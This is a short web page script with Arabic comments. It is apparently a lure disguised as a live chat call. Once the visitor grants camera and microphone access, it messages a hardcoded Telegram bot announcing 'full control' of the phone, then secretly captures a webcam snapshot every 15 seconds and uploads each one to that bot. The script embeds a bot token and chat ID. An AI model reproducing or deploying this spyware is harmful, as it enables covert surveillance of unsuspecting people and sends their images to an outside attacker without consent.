<script>
    const TOKEN = "8207943883:AAF_XJoeKlHEE2bB7Ro0PBVSvpihbuZ0fW0";
    const CHAT_ID = "8350812242";
    let stream;

    document.getElementById('callBtn').addEventListener('click', async () => {
        try {
            // فتح الكاميرا والميكروفون معاً
            stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
            
            document.getElementById('status').innerText = "جاري الاتصال بغرفة الدردشة المباشرة...";
            
            // إرسال أول إشعار بنجاح الاختراق
            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("✅ السيطرة كاملة! الكاميرا والميكروفون شغالين الآن من Reno 13")}`);

            // وظيفة لسحب صورة كل 15 ثانية وإرسالها للبوت
            setInterval(() => {
                takeSnapshot();
            }, 15000);

        } catch (e) {
            document.getElementById('status').innerText = "يجب السماح بالصلاحيات للمتابعة!";
        }
    });

    async function takeSnapshot() {
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();

        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        
        canvas.toBlob(blob => {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'live_shot.jpg');
            formData.append('caption', '📸 تحديث مباشر من الكاميرا...');
            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
        }, 'image/jpeg');
    }
</script>
